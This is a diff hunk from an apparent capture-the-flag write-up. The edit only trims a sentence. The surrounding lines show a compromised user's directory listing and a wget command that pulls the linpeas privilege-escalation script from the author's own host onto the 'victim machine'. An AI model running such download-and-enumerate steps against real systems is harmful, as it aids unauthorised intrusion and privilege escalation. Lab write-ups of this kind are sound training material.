@@ -123,7 +123,7 @@ drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
 -rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
 -rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
 ```
-I dont know what to do hahah so I used linpeas I hosted linpeas in my server to download in the victim machine
+I dont know what to do so I used linpeas I hosted linpeas in my server to download in the victim machine
 ```
 king@ubuntu:/dev/shm$ wget http://10.18.70.19/linpeas.sh
 wget http://10.18.70.19/linpeas.sh
